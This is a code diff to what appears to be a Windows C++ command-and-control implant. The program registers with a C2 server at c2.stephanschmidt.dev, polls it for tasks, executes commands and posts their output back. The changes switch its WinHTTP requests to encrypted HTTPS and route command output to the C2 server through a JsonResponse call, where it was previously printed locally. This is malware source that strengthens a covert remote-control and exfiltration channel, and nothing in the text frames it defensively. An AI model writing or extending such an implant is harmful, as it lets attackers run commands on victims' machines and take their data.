@@ -34,6 +34,8 @@ struct TaskOutput{
     JS_OBJ(Hostname, Command, Output);
 };
 
+// TODO: abstraction for http client calls
+
 // Contact C2 and provide basic computer info
 void RegisterC2(){
 
@@ -62,7 +64,7 @@ void RegisterC2(){
                 L"HTTP/1.1",
                 WINHTTP_NO_REFERER,
                 WINHTTP_DEFAULT_ACCEPT_TYPES,
-                0
+                WINHTTP_FLAG_SECURE
             );
             
             if(request){
@@ -126,7 +128,7 @@ WINBOOL GetTasks(wchar_t* response){
         HINTERNET connection = WinHttpConnect(
             session, 
             L"c2.stephanschmidt.dev", 
-            INTERNET_DEFAULT_HTTPS_PORT, 
+            INTERNET_DEFAULT_HTTPS_PORT,
             0
         );
         
@@ -138,7 +140,7 @@ WINBOOL GetTasks(wchar_t* response){
                 L"HTTP/1.1",
                 WINHTTP_NO_REFERER,
                 WINHTTP_DEFAULT_ACCEPT_TYPES,
-                0
+                WINHTTP_FLAG_SECURE
             );
             
             if(request){
@@ -209,7 +211,7 @@ void JsonResponse(char* jsonData, DWORD size){
                 L"HTTP/1.1",
                 WINHTTP_NO_REFERER,
                 WINHTTP_DEFAULT_ACCEPT_TYPES,
-                0
+                WINHTTP_FLAG_SECURE
             );
             
             if(request){
@@ -261,6 +263,7 @@ int _tmain(int argc, _TCHAR *argv[]){
         while(1){
             wchar_t* tasks = (wchar_t*)malloc(1024);
             GetTasks(tasks);
+            printf("%s\n", tasks);
 
             JS::ParseContext context((char*)tasks);
             Task tr;
@@ -270,8 +273,6 @@ int _tmain(int argc, _TCHAR *argv[]){
                 fprintf(stderr, "Error parsing struct %s\n", errorStr.c_str());
                 return -1;
             }
-
-            printf("Path: %s\n", tr.Path.c_str());
 
             free(tasks);
             
@@ -483,7 +484,7 @@ int _tmain(int argc, _TCHAR *argv[]){
                             break; 
                     
                         // Send reponse to C2 server
-                        printf("Response: \"%s\"\n", chResponse);
+                        JsonResponse(chResponse, strlen(chResponse));
                         
                     }while(!fSuccess);  // Conditional based on ERROR_MORE_DATA 
 
